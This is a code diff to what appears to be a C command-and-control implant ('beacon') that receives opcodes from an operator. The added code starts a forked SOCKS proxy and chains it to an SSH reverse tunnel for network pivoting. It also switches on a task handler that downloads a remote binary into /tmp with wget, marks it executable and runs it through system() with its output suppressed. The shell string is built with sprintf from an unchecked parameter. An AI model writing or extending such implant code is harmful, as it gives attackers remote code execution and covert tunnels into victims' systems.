@@ -10,13 +10,60 @@
 #include "command.h"
 #include "beacon.h"
 #include "colors.h"
+#include "socks.h"
 #include "ssh.h"
+
+#define EXEC_SUCCESS 1
+#define EXEC_FAIL (-1)
 
 #define MAX_ATTR_LEN 128
 
 struct process tcp_tunnel = { 0 };
 struct process ssh_tunnel = { 0 };
 struct process task = { 0 };
+struct process socks_sv = { 0 };
+
+
+static int exec_socks_server(int lport)
+{
+	if (lport < 1 || lport > 65535)
+		return EXEC_FAIL;
+
+	sigset_t new_mask, old_mask;
+	sigemptyset(&new_mask);
+	sigaddset(&new_mask, SIGCHLD);
+	if (sigprocmask(SIG_BLOCK, &new_mask, &old_mask) == -1) {
+		printf(RED("sigprocmask\n"));
+	}
+
+	socks_sv.pid = 0;
+	socks_sv.is_alive = 0;
+
+	int ret;
+	pid_t pid = fork();
+	switch (pid) {
+	case -1:		/* Error */
+		printf(RED("[*] Fork error\n"));
+		ret = EXEC_FAIL;
+		break;
+	case 0:		/* Child, do tunnel */
+		ret = start_socks_sv(lport);
+		//ret = EXIT_SUCCESS;
+		printf(YELLOW("[SOCKS] Execution terminated with status %d\n"),
+		       ret);
+		_exit(ret);
+	default:		/* Parent, go back to execution loop */
+		socks_sv.pid = pid;
+		socks_sv.is_alive = 1;
+		if (sigprocmask(SIG_SETMASK, &old_mask, NULL) == -1) {
+			printf(RED("Could not restore signal mask!\n"));
+		}
+		printf(BLUE("[*] Started SOCKS server\n"));
+		ret = EXEC_SUCCESS;	/* SUCC */
+	}
+
+	return ret;
+}
 
 /* OpenSSH command equivalent:
  * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
@@ -24,7 +71,7 @@ struct process task = { 0 };
  * lport:   port to forward to once tunnel established
  * rport:   port the ssh server will be listening on
  */
-static int remote_forwarding(int lport, int rport)
+static int exec_open_tcp_tunnel(int lport, int rport)
 {
 	if ((rport < 1 || rport > 65535) || (lport < 1 || lport > 65535))
 		return -1;
@@ -70,9 +117,6 @@ static int validate_param(const char *cmd, const char *param)
 	return 1;
 }
 
-#define EXEC_SUCCESS 1
-#define EXEC_FAIL (-1)
-
 static int exec_command(char *cmd, char *param)
 {
 	int ret = 0;
@@ -89,7 +133,7 @@ static int exec_command(char *cmd, char *param)
 		int lport, rport;
 		sscanf(param, "L%dC%d", &lport, &rport);
 		printf("[*] Calling do_remote_tunnel(%d, %d)\n", lport, rport);
-		ret = remote_forwarding(lport, rport);
+		ret = exec_open_tcp_tunnel(lport, rport);
 		if (ret == EXEC_SUCCESS) {
 			printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
 			       lport);
@@ -117,8 +161,24 @@ static int exec_command(char *cmd, char *param)
 		printf(GREEN("[CSSH] SSH tunnel closed\n"));
 		return EXEC_FAIL;
 	} else if (strcmp(cmd, "ODYN") == 0) {
-		printf(GREEN("[ODYN] Opened dynamic on port X\n"));
-		return EXEC_FAIL;
+		// if (is_valid_port_spec())
+		int lport, rport;
+		sscanf(param, "L%dC%d", &lport, &rport);
+		ret = exec_socks_server(lport);
+		if (ret == EXEC_SUCCESS) {
+			printf(GREEN("[*] Started SOCKS server on port %d\n"),
+			       lport);
+			ret = exec_open_tcp_tunnel(lport, rport);
+			if (ret == EXEC_SUCCESS) {
+				printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
+				       lport);
+				printf(GREEN("[*] Opened dynamic tunnel\n"));
+			} else {
+				printf(RED("[*] Failed to open TCP tunnel\n"));
+			}
+		} else {
+			printf(RED("[*] Failed to start SOCKS server\n"));
+		}
 	} else if (strcmp(cmd, "CDYN") == 0) {
 		printf(GREEN("[CDYN] Dynamic closed\n"));
 		return EXEC_FAIL;
@@ -130,12 +190,20 @@ static int exec_command(char *cmd, char *param)
 		char *filename = basename(param);
 		// wget -O /tmp/evil http://127.0.0.1/http_client_linux_x64 && chmod u+x /tmp/evil && /tmp/evil
 		sprintf(cmd_str,
-			"wget -O /tmp/%s %s && chmod u+x /tmp/%s && /tmp/%s",
+			"wget -O /tmp/%s %s > /dev/null 2>&1 && chmod u+x /tmp/%s && /tmp/%s > /dev/null 2>&1",
 			filename, param, filename, filename);
 		printf(GREEN("[TASK] %s\n"), cmd_str);
-		// system(cmd_str);
+		ret = system(cmd_str); // replace with fork and exec
+		if (ret == -1) {
+			/* Child process could not be created or status
+			   could not be retrieved */
+			ret = EXEC_FAIL;
+		} else if (WEXITSTATUS(ret) == 127) {
+			ret = EXEC_FAIL;
+		} else {
+			ret = EXEC_SUCCESS;
+		}
 		free(cmd_str);
-		return EXEC_FAIL;
 	}
 
 	return ret;
